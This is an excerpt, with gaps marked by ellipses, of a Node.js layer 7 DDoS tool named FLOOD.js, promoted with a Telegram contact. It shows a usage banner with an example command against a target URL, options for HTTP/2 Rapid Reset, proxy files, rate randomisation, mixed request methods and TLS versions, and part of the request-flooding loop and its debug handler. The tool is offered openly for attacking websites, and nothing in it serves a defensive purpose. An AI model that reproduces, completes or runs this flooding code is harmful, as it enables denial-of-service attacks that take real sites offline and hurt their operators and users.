/*
Method DDoS Development By LIService
...
if (process.argv.length < 7) {
    console.clear();
    console.log(`
Method DDoS Layer 7 Development By LIService 
Telegram: t.me/LIService

Usage: node FLOOD.js [Target] [Time] [Threads] [Ratelimit] [ProxyFile] [Options]
Example: node FLOOD.js https://target.com 120 8 10 proxy.txt --reset true --mix true --query 3

Options FLOOD
--debug true Enable Debugging & Response code.
--query 1/2/3 Generate query [1: ?q=wsqd], [2: ?wsqd], [3: wsqd]
--randrate true Random rate of requests 
--reset true Activate the reconnection system or Rapid Reset
--mix true Randomize request methods [GET/POST/HEAD/ETC]
--tls 1/2/3 TLS max version [1:TLSv1] [2:TLSv2] [3:TLSv3]`);
    process.exit(0)
};
                ...
                function request() {
                    ...
                    for (let i = 0; i < rate; i++) {
                        ...
                        function handler(res) {
                            ...
                            if (enabled('debug')) {
                                console.log(`[${'FLOOD'.bold}] | (${colors.magenta(`${proxyHost}`.underline)}) ${headers[":authority"]}${headers[":path"]} [${coloredStatus}]`);
                            }
                        }
                        req.on("response", (res) => {
                            handler(res);
